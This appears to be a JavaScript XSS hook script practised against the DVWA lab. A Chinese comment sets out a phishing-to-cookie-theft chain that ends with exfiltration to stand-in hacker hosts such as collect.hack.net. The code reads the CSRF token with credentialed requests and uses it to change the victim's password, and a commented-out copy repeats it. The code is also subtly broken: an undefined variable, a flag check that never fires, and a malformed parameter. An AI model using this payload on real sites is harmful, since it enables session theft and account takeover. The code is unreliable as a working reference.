/*
1. 诱导受害者访问钓鱼网站
2. 钓鱼网站触发访问目标(可信本地存在cookie)站点
3. 触发本地PC 下载hook.js 文件
4. 本地PC 运行hook.js 文件，获取cookie
5. 发给hacker 站点，收集cookie
6. hacker 站点以邮件形式发出

http://target.vulhost.com/xss.php # 目标站点
http://gofish.hack.net/index.jsp # 社工伪造钓鱼网站
http://hook.hack.net/xss_hook.js # hook 站点
http://collect.hack.net/xss_hook2email.php # 通过hook 站点收集信息的站点
*/

function csrfAttack(url, pass) {
    if (window.XMLHttpRequest) {
        xmlhttp = new XMLHttpRequest();
    } else {
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.withCredentials = true;
    var hacked = false;
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
            var regex = /user_token\'value\=\'(.*?)\'\/\>/;
            var match = text.match(regex);
            var token = match[1];
            var newUrl = url + "?user_token=" + token + "&password_new" + pass + "&password_conf=" + pass + "&Change=Changge"
            if (hacked) {
                alert("Got token: " + match[1]);
                hacked = true;
                xmlhttp.open("GET", newUrl, false);
                xmlhttp.send();
            }
        }
    };
    xmlhttp.open("GET", url, false);
    xmlhttp.send();
}

alert(document.cookie);
var url = "http://www.dvwa.com/vulnerabilities/csrf/";
var pass = "password";

csrfAttack(url, pass);

/*
alert(document.cookie);

var url = "http://www.dvwa.com/vulnerabilities/csrf/";
var pass = "password";
if (window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
} else {
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.withCredentials = true;
var hacked = false;
xmlhttp.onreadystatechange = function () {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
        var regex = /user_token\'value\=\'(.*?)\'\/\>/;
        var match = text.match(regex);
        var token = match[1];
        var newUrl = url + "?user_token=" + token + "&password_new" + pass + "&password_conf=" + pass + "&Change=Changge"
        if (hacked) {
            alert("Got token: " + match[1]);
            hacked = true;
            xmlhttp.open("GET", newUrl, false);
            xmlhttp.send();
        }
    }
};

xmlhttp.open("GET", url, false);
xmlhttp.send();

*/


